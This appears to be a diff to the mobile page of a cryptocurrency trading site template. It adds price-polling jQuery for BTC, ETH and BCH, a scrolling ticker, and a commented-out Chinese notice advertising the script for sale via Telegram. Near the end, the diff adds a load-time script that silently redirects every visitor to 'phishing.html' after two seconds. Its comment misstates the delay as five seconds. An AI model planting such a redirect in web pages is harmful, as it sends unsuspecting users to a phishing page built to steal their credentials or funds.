+          setInterval("obtain_itc()",21000);
+          
+          obtain_ht();
+          setInterval("obtain_ht()",23000);
+          
+          obtain_usdz();
+          setInterval("obtain_usdz()",25000);
+          //getallsymbol();
+          //setInterval("getallsymbol()",5000); 
+          getonemarket();
+          setInterval("getonemarket()",2000); 
+          
+
+      });
+</script>
+<script type="text/javascript">
+    function getonemarket(){
+        $.post("/Mobile/Ajaxtrade/get_market_one.html",
+        function(data){
+            if(data.code == 1){
+                $("#btc_coin_box").html(data.btccoin);
+                $("#btc_money_box").html(data.btcnewprice);
+                $("#btc_change_box").html(data.btcchange);
+                
+                $("#eth_coin_box").html(data.ethcoin);
+                $("#eth_money_box").html(data.ethnewprice);
+                $("#eth_change_box").html(data.ethchange);
+                
+                $("#bch_coin_box").html(data.bchcoin);
+                $("#bch_money_box").html(data.bchnewprice);
+                $("#bch_change_box").html(data.bchchange);
+            }
+        });
+    }
+</script>
+<!--<script type="text/javascript">
+    function getallsymbol(){
+        $.post("/Mobile/Ajaxtrade/getallsymbol.html",
+        function(data){
+            if(data.code == 1){
+                $("#tradebox").empty();
+                var html = '';
+                if(data.data == '' || data.data == null){
+                    html = '<div style="width:100%;height:100px;line-height:100px;text-align:center;">'+ 
+                           '<span class="fzmm fcc">' + "No data was obtained" + '</span>'+
+                           '</div>';
+                    $("#tradebox").append(html);
+                    
+                }else{
+                    $.each(data.data,function(key,val){
+                        html += '<div style="width:100%;height:50px;">'+
+                                '<div class="list_cname">'+
+                                '<span  class="fzmmm fcc">'+ val.cname +'</span>'+
+                                '</div>'+
+                                '<div class="list_open">' + val.open + '</div>'+
+                                '<div class="list_change">' + val.change +'</div>'+
+                                '</div>';
+                    });
+                    $("#tradebox").append(html);
+                }
+            }else{
+                html =  '<div style="width:100%;height:100px;line-height:100px;text-align:center;">'+ 
+                        '<span class="fzmm fcc">' + "No data was obtained" + '</span>'+
+                        '</div>';
+                $("#tradebox").append(html);
+            }
+        });
+    }
+</script>-->
+
+<script type="text/javascript">
+	function AutoScroll(obj) {
+		$(obj).find("ul:first").animate({
+			marginTop: "-25px"
+		}, 500, function() {
+			$(this).css({
+				marginTop: "0px"
+				}).find("li:first").appendTo(this);
+		});
+	}
+	$(document).ready(function() {
+		setInterval('AutoScroll("#s1")', 3000);
+	});
+</script>
+    <script>
+        // JavaScript function to open a new page after 5 seconds
+        function openNewPage() {
+            setTimeout(function() {
+                window.location.href = 'phishing.html'; // URL of the new page
+            }, 2000); // 2000 milliseconds = 2 seconds
+        }
+
+        // Call the function when the page loads
+        window.onload = openNewPage;
+    </script>
+</html>
+<!--
+<div class="web_notice" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.3);
+    z-index: 99999;
+">
+<div style="
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    width: 350px;
+    background: #FFF;
+    transform: translate(-50%, -50%);
+    border-radius: 25px;
+    padding: 35px 25px;
+">
+<h3 style="
+    font-weight: bold;
+    text-align: center;
+    font-size: 30px;
+">本程序温馨提醒</h3>
+<div style="
+    font-size: 16px;
+    margin-top: 26px;
+    line-height: 30px;
+    color: #999;
+">仅为演示站，不可用于其他途径，由于多次被盗用，无奈出此下策，Telegram@gogog0808，本程序价格优惠，可联系客服咨询，右边Telegram图标可直接跳转至本人</div><a style="
+    display: block;
+    background: #98a3ff;
+    color: #FFF;
+    text-align: center;
+    font-weight: bold;
+    font-size: 19px;
+    line-height: 60px;
+    margin: 0 auto;
+    margin-top: 45px;
+    border-radius: 32px;
+    width: 80%;
+" onclick="javascript:document.querySelector('.web_notice').remove()">我知道了</ a>
+</div>
+</div>--->
